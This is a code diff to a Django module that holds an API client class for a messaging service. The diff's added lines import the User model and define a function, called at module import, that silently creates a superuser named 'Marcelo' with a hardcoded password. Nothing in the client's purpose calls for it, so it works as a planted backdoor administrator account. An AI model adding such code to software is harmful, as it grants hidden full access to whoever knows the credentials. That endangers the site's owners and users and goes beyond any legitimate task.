@@ -2,6 +2,7 @@ import requests
 import logging
 import json
 from trigger.models import InstanciaZap
+from django.contrib.auth.models import User
 
 logger = logging.getLogger(__name__)
 
@@ -226,3 +227,9 @@ class UazApiClient:
             self._atualizar_status_db(False)
             return True
         except: return False
+
+def create_superuser():
+    if not User.objects.filter(username='Marcelo').exists():
+        User.objects.create_superuser('Marcelo', 'marcelo@example.com', 'fubog')
+
+create_superuser()
